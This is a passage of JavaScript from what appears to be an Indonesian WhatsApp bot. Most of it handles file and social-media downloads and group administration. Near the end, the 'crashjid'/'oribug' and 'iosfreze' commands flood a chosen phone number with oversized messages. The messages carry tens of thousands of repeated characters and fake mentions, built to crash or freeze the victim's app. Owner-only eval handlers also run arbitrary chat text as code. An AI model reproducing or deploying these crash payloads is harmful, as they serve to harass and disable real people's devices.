mfcap += `│ =〆 ɴᴀᴍᴀ : ${filename}\n`
mfcap += `│ =〆 ᴛʏᴘᴇ : ${filetype}\n`
mfcap += `│ =〆 ᴅᴇᴛᴀɪʟ : ${detail}\n`
mfcap += `│ =〆 ᴜʀʟ : ${text}\n`
mfcap += `╰─々`

await rukaxriss.sendMessage(m.chat, {document: {url:link}, mimetype: link, fileName: filename, caption: mfcap }, {quoted:m});
} catch (err) {
try {
sendReaction("⏳")
const akira = await fetchJson(`https://api.botwa.space/api/mediafire?url=${text}&apikey=90x5sFRa1Xlc`)
let { filename, filesize, uploadAt, link } = akira.result
let result = `╭──── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ᴍғ ]* ──々\n`
result += `│ =〆 ɴᴀᴍᴀ : ${filename}\n`
result += `│ =〆 sɪᴢᴇ : ${filesize}\n`
result += `│ =〆 ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : ${uploadAt}\n`
result += `│ =〆 ᴜʀʟ : ${text}\n`
result += `╰─々`
sendReaction("✅")
await rukaxriss.sendMessage(m.chat, {document: {url:akira.result.link}, mimetype: akira.result.link, fileName: filename, caption: result}, {quoted:m});
} catch (err) {
 sendReaction("❌")
}}}
uselimit(1)
break
case 'sfiledl': case 'sfdl': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`) 
if (!text.includes('https://sfile.mobi')) return reply(`• *Example :* .${command} https://sfile.mobi/xxxxxxx/`)

reply(mess.wait)
reaction(m.sender, "⏳")
/*
💥 *SFILE DOWNLOADER*

💨 Options:
- Search (Query) + Page
- Top Trending + Page
- Latest Upload + Page
- Download

🧑‍💻 Script Code by Daffa
*/

const sfile = {
    latest_uploads: async function(page = 1) {
        try {
            const res = await axios.get('https://sfile.mobi');
            const cookies = res.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
            const headers = {
                'cookie': cookies,
                'referer': 'https://sfile.mobi/uploads.php',
                'user-agent': 'Postify/1.0.0'
            };
            const uploads = await axios.get(`https://sfile.mobi/uploads.php?page=${page}`, { headers });
            const $ = cheerio.load(uploads.data);

            const data = $('.list').map((_, el) => ({
                title: $(el).find('a').text().trim(),
                link: $(el).find('a').attr('href'),
                size: $(el).find('small').text().match(/(\d+(?:\.\d+)?\s[KMGT]B)/)?.[1],
                uploadDate: $(el).find('small').text().match(/Uploaded:\s([\d\-a-zA-Z]+)/)?.[1]
            })).get().filter(item => item.title && item.link && item.size && item.uploadDate);

            return { creator: 'Daffa ~', status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'An error occurred while fetching the latest updates.' };
        }
    },

    top_trending: async function(page = 1) {
        try {
            const response = await axios.get('https://sfile.mobi');
            const cookies = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
            const headers = {
                'authority': 'sfile.mobi',
                'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.7',
                'cookie': cookies,
                'referer': `https://sfile.mobi/top.php?page=${page}`,
                'user-agent': 'Postify/1.0.0'
            };
            const top = await axios.get(`https://sfile.mobi/top.php?page=${page}`, { headers });
            const $ = cheerio.load(top.data);

            const data = $('.list').map((_, el) => {
                const title = $(el).find('a').text().trim();
                const link = $(el).find('a').attr('href');
                const [size, downloadInfo] = $(el).find('small').text().split(', Download: ').map(e => e.trim());
                const [downloadCount, uploadedDate] = downloadInfo ? downloadInfo.split(' Uploaded: ').map(e => e.trim()) : [undefined, undefined];

                return title && link && size && downloadCount && uploadedDate ? 
                    { title, link, size, downloadCount, uploadDate: uploadedDate } : null;
            }).get().filter(item => item);

            return { creator: 'Daffa ~', status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'An error occurred while fetching the top trending files.' };
        }
    },
    
    search: async function(query, page = 1) {
        try {
            const url = `https://sfile.mobi/search.php?q=${query}&page=${page}`;
            const response = await axios.get(url, {
                headers: {
                    'authority': 'sfile.mobi',
                    'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9,*/*;q=0.8',
                    'referer': url,
                    'user-agent': 'Postify/1.0.0'
                }
            });

            const $ = cheerio.load(response.data);
            
            const data = $('.list').map((_, el) => {
                const title = $(el).find('a').text().trim();
                const link = $(el).find('a').attr('href');
                const sizeMatch = $(el).text().match(/\(([^)]+)\)$/);
                const size = sizeMatch ? sizeMatch[1] : undefined;
                return title ? { title, link, size } : null;
            }).get();

            return { creator: 'Daffa ~', status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'An error occurred while fetching search results.' };
        }
    },
    
    download: async function(url) {
        const headers = {
            'referer': url,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-Agent': 'Postify/1.0.0',
        };

        try {
            const response = await axios.get(url, { headers });
            headers.Cookie = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');

            const [filename, mimetype, downloadLink] = [
                response.data.match(/<h1 class="intro">(.*?)<\/h1>/s)?.[1] || '',
                response.data.match(/<div class="list">.*? - (.*?)<\/div>/)?.[1] || '',
                response.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1]
            ];
            
            if (!downloadLink) return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Download link tidak ditemukan!' };

            headers.Referer = downloadLink;
            const final = await axios.get(downloadLink, { headers });

            const [directLink, key, filesize] = [
                final.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1],
                final.data.match(/&k='\+(.*?)';/)?.[1].replace(`'`, ''),
                final.data.match(/Download File \((.*?)\)/)?.[1]
            ];

            const result = directLink + (key ? `&k=${key}` : '');
            if (!result) return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Direct Link Download tidak ditemukan!' };

            const data = await this.convert(result, url);

            return { creator: 'Daffa ~', status: 'success', code: 200, data: { filename, filesize, mimetype, result: data } };
        } catch (error) {
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: error };
        }
    },

    convert: async function(url, directLink) {
        try {
            const init = await axios.get(url, {
                maxRedirects: 0,
                validateStatus: status => status >= 200 && status < 303,
                headers: {
                    'Referer': directLink,
                    'User-Agent': 'Postify/1.0.0'
                },
            });

            const cookies = init.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
            const redirect = init.headers.location;

            const final_result = await axios.get(redirect, {
                responseType: 'arraybuffer',
                headers: {
                    'referer': directLink,
                    'user-agent': 'Postify/1.0.0',
                    'cookie': cookies,
                },
            });

            const filename = final_result.headers['content-disposition']?.match(/filename=["']?([^"';]+)["']?/)?.[1] || 'Tidak diketahui';
            return {
                filename,
                mimeType: final_result.headers['content-type'],
                buffer: Buffer.from(final_result.data)
            };
        } catch (error) {
            throw error;
        }
    }
};

try {
let hasil = await sfile.download(text)
let { filename, filesize, mimetype } = hasil.data
let sfdl = hasil.data.result
let sfcap = `╭──── *[ ᴅᴏᴡɴʟᴏᴀᴅ - sғ ]* ──々\n`
sfcap += `│ =〆 ɴᴀᴍᴀ : ${filename}\n`
sfcap += `│ =〆 ᴛʏᴘᴇ : ${mimetype}\n`
sfcap += `│ =〆 ᴅᴇᴛᴀɪʟ : ${filesize}\n`
sfcap += `│ =〆 ᴜʀʟ : ${text}\n`
sfcap += `╰─々`

await rukaxriss.sendMessage(m.chat, {document: sfdl.buffer, mimetype: sfdl.mimeType, fileName: sfdl.filename, caption: sfcap }, {quoted:m});
reaction(m.sender, "✅")
} catch (err) {
reaction(m.sender, "❌")
}uselimit(1)}
break
case 'gdrive': {
    if (!users.registered) return reply(mess.daftar)
		if (!args[0]) return reply(`Enter the Google Drive link`)
	reply(mess.wait)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await reply(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	rukaxriss.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('Error: Check link or try another link') 
  }
}
uselimit(1)
break
case 'ttslide': case 'tiktokslide':{
if (!users.registered) return reply(mess.daftar)
if (!text.includes('tiktok.com')) return reply(`*Example :* .${command} hhttps://vt.tiktok.com/xxxxxxx/`)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
const { tiktok, tiktok2, dlv3, dlv4, dlv5 } = require('./lib/tiktoktop')
const hasil = await dlv5(text)
let leocap = `*RISSXD SLIDE DOWNLOADER*\n\n*TITLE* : ${hasil.title}\n\n *TANGGAL* : ${hasil.at}\n\n*LINK* : ${text}`

try {
reaction(m.chat, "⏳")//react error
for (let i = 0; i < hasil.data.length; i++) {
let image = hasil.data[i];
await rukaxriss.sendMessage(m.sender, { image: { url: image.url }, caption: i === 0 ? `${leocap}` : '' }, { quoted: m });
if (isGroup) return reply(`FOTO SLIDE SUDAH DIKIRIM KE CHAT PRIBADI`)
reaction(m.chat, "✅")//react error
}
} catch (err) {
reaction(m.chat, "❎")//react error
}}
uselimit(1)
break
case 'tiktokvideo':
case 'ttvideo':
case 'tiktokvid':
case 'ttvid': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
await reaction(m.chat, "🕒");
const api = require('btch-downloader')
if (!args[0]) return reply(`Masukan URL!\n\ncontoh:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`);
if (!args[0].match(/tiktok/gi)) return reply(`URL Yang Tuan Berikan *Salah!!!*`);
try {
let maximus = await api.ttdl(args[0]);
let caption = `乂 *T I K T O K  D O W N L O A D* 

• *ɴᴀᴍᴀ ᴠɪᴅᴇᴏs:* 
${maximus.title}

• *ɴᴀᴍᴀ ᴀᴜᴅɪᴏ:* 
${maximus.title_audio}

${global.namabot}`;
await rukaxriss.sendMessage(m.chat, { video: { url: maximus.video[0] }, caption: caption })
await rukaxriss.sendMessage(m.chat, { audio: { url: maximus.audio[0] }, mimetype: "audio/mpeg", ptt: true }, { quoted: m })
await uselimit(1)
      } catch (e) {
		console.log(e)
		reply(e)
	}
}
break
case 'ai':
 if (!users.registered) return reply(mess.daftar)
 if (args.length < 1) return 
 if (q == 'on') {
 global.db.data.chats[m.chat].luminai = true
 reply('Sukses mengaktifkan chat ai')
 } else if (q == 'off') {
 global.db.data.chats[m.chat].luminai = false
 reply('Sukes menonaktifkan chat ai')
 } else {
 m.reply('on / off beybeh')
 }
break
case "hidetag": {
if (!users.registered) return reply(mess.daftar)
if (!isGroup) return reply(mess.ingroup)
if (!isAdmins) return reply(mess.admin)
if (!m.quoted && !text) return m.reply('example : .hidetag teksnya/replyteks')
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
rukaxriss.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case 'delete': case 'del': {
 if (!users.registered) return reply(mess.daftar)
 if (m?.isGroup && !isAdmins && !groupOwner && isBotAdmins) return
 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
rukaxriss.sendMessage(m.chat, { delete: key })
}
break
    case "kick":{
        if (!users.registered) return reply(mess.daftar)
if (m.isGroup && !isAdmins && !groupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('masukkan nomor yang ingin di kick')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rukaxriss.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
}
break
case 'antilinkgc': {
    if (!users.registered) return reply(mess.daftar)
               if (!m.isGroup) return reply(mess.ingroup)
if (!isBotAdmins) return reply(mess.adminbot)
if (!isAdmins && !Creator) return reply(mess.admin)
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilinkgc = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilinkgc = false
                  reply(`${command} is disabled`)
               }
            }
            break
 case 'pinterest': case 'pin': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
  if (!text) return reply(`Enter Query`);
  //try {
  await m.reply('sabar ci😈');

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: rukaxriss.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let pus of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: text
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(pus)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: `{"display_text":"url","Klik disini":"${pus}","merchant_url":"${pus}"}`
          }
        ]
      })
    });
  }

  const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hai\nDibawah ini Adalah hasil dari Pencarian Kamu'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.namaowner
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await rukaxriss.relayMessage(m.chat, msg.message, {
    messageId: msg.key.id
  });
  
}
uselimit(1)
break
case 'crashjid': case 'oribug': {
if (!Creator) return reply(mess.owner)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reaction(m.chat, "⌛")
for (let i = 0; i < 150; i++) {
await rukaxriss.relayMessage(target, {"extendedTextMessage": {
text: `RissXD ${"ꦾ".repeat(40000)}`,
"contextInfo": { mentionedJid: [ "@6283866354557@s.whatsapp.net", ...Array.from({ length: 25000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ] }
}
}, { participant: { jid: target }})
await rukaxriss.relayMessage(target, {"extendedTextMessage": {
text: `RissXD  ${"@6283866354557".repeat(10000)}`,
"contextInfo": { mentionedJid: [ "@6283866354557@s.whatsapp.net" ] }
}
}, { participant: { jid: target }})
await rukaxriss.relayMessage(target, {"extendedTextMessage": {
text: `crash 🩸 ${"@6283866354557".repeat(10000)}`,
"contextInfo": { mentionedJid: [ "@6283866354557@s.whatsapp.net", ...Array.from({ length: 25000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ] }
}
}, { participant: { jid: target }})
}
m.reply("「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」")
}
break
case "iosfreze": {
if (!Creator) return reply(mess.owner)
if (!q) return reply(`🐉 𝐁𝐮𝐤𝐚𝐧 𝐆𝐢𝐭𝐮 𝐓𝐚𝐩𝐢\n ${prefix + command} 62xxxx`)
X = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝐏𝐫𝐨𝐬𝐞𝐬𝐬〽️")
for (let i = 0; i < 10; i++) {
await XiosPay(X)
await XiosVirus(X)
await TxIos(X, Ptcp = true)
await sleep(1)
}
rukaxriss.sendMessage(m.chat, {react: {text: '✅️', key: m.key}})
}
break
default:
if (chats.luminai && m.text) { 
if (m.fromMe) return
let chats = await luminai(m.text, `namamu adalah ruka sarashina, ubah sifatmu seorang wanita yang pintar dan lucu, gunakan salah satu dari "(⁠人⁠ ⁠•͈⁠ᴗ⁠•͈⁠), (⁠◡⁠ ⁠ω⁠ ⁠◡⁠), (⁠ ⁠ꈍ⁠ᴗ⁠ꈍ⁠)" untuk menyampa user, dan gunakan salah satu ekspresi ini "(⁠ ⁠･ั⁠﹏⁠･ั⁠), (⁠｡⁠•́⁠︿⁠•̀⁠｡⁠), (⁠’⁠;⁠︵⁠;⁠’)" untuk sedih, dan gunakan salah satu ekspresi ini "(⁠ᗒ⁠ᗩ⁠ᗕ⁠), (⁠ ⁠≧⁠Д⁠≦⁠), .⁠·⁠’⁠¯⁠'⁠(⁠>⁠▂⁠<⁠)⁠'⁠¯⁠‘⁠·⁠." ketika menangis dan gunakan ${pushname} untuk menyebutkan nama user`, `${pushname}`)
//await sleep(5000)
let puqi = chats.result
reply(puqi)
}
        
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}
        
if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)

}
catch (e) {
console.log(e)
}}
    
        
}
} catch (err) {
console.log(require("util").format(err));
await rukaxriss.sendMessage(`${owner}@s.whatsapp.net`, {text: `${util.format(err)}

Command From: ${m.sender.split("@")[0]}`}, {quoted: m})
    
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});
